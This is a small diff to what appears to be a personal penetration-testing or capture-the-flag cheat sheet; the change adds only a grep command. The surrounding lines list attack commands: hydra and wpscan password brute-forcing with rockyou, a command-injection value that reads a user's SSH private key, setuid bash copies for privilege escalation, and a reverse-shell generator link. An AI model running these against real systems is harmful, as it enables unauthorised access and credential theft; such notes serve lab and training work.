@@ -10,6 +10,8 @@ hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 222
 
 mysql -h 10.10.70.250 -u root -p
 
+grep -r 'looking_for_this' /in/this/directory
+
 wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt
 
 ;cat /home/user/.ssh/id_rsa to get the SSH key
@@ -30,3 +32,4 @@ chmod +s /bin/bash
 cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell
 
 https://www.revshells.com/
+
